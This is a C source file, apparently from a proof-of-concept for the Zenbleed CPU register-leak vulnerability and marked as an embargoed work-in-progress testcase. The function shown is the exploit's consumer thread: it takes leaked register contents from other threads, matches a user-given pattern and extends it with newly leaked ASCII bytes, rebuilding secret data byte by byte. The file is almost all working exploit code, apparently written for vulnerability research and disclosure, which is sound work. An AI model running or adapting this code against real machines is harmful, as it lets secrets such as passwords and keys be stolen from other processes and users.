#define _GNU_SOURCE
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <x86intrin.h>
#include <sched.h>
#include <syscall.h>
#include <err.h>
#include <pthread.h>
#include <assert.h>
#include <ctype.h>
#include <signal.h>
#include <sys/sysinfo.h>

#include "zenbleed.h"

//
// This is a Work-in-Progress testcase for the Zenbleed vulnerability.
//
// ** DO NOT DISTRIBUTE - EMBARGOED SECURITY ISSUE **
//
// Tavis Ormandy <taviso@google.com>
//

// This thread just collects the leaked data from other threads.
void * pattern_leak_consumer(void *param)
{
    size_t patlen;
    char *patbuf;

    // If the user only gave us 4 chars, we will use that granularity.
    patlen = strlen(param);
    patbuf = calloc(patlen + 1, sizeof(char));

    // Copy the initial pattern to our pattern buffer.
    strncpy(patbuf, param, patlen);

    // 16 is the maximum, but realistically 4 or 5 seems better.
    if (patlen > 8) {
        warnx("The pattern `%s` might be too long, shorter strings work better.", patbuf);
    }

    fprintf(stdout, "%s", patbuf);
    fflush(stdout);

    // Now scan leaks for this pattern.
    while (true) {
        size_t matchlen;
        char  *matchptr;
        char  *s;
        struct zenleak *leak = NULL;

        // Wait for a leaker to produce some work.
        leak = load_new_leak();

        // Now check if this contains a specific pattern.
        matchptr = memmem(leak->regbuf, sizeof(leak->regbuf), patbuf, strlen(patbuf));

        if (matchptr == NULL) {
            goto boring;
        }

        // How many bytes did we learn?
        matchlen = sizeof(leak->regbuf) - (matchptr - (char *) leak->regbuf);

        assert(matchlen);

        // Now move matchptr forward to the first byte we didn't know.
        for (s = patbuf; *matchptr == *s; matchptr++, s++) {
            // No new bytes to learn :(
            if (--matchlen == 0)
                break;
        }

        // Verify that this is all ASCII
        for (int i = 0; i < matchlen; i++) {
            if (!isascii(matchptr[i])) {
                matchlen = i;
                break;
            }
        }

        fprintf(stdout, "%ld %s", matchlen, matchptr);

        // If the match is bigger than our pattern size, we skip to the end of it.
        if (matchlen > patlen) {
            matchptr += matchlen - patlen;
            matchlen  = patlen;
        }

        // Now add this to our patbuf.
        // If we learned 4 new bytes, we throw away the first 4 bytes of patbuf.
        memmove(&patbuf[0], &patbuf[matchlen], patlen - matchlen);

        // Make those new missing bytes nul.
        memset(&patbuf[patlen - matchlen], 0, matchlen);

        // Now append the new bytes.
        strncat(patbuf, matchptr, matchlen);

        fflush(stdout);
    boring:
        free(leak);
    }

    free(patbuf);
    return 0;
}
